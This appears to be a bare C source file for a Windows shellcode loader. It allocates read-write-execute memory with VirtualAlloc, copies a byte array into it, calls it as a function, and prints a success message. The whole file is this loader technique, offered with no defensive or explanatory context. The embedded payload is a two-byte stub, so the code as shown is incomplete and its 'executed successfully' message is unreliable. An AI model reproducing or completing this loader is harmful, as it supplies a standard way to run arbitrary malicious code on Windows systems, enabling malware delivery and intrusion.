#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
int main() {
    unsigned char shellcode[] = "\xfc\x48";
    void* execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }
    memcpy(execMem, shellcode, sizeof(shellcode));
    ((void(*)())execMem)();
    VirtualFree(execMem, 0, MEM_RELEASE);
    printf("Shellcode executed successfully!\n");
    return 0;
}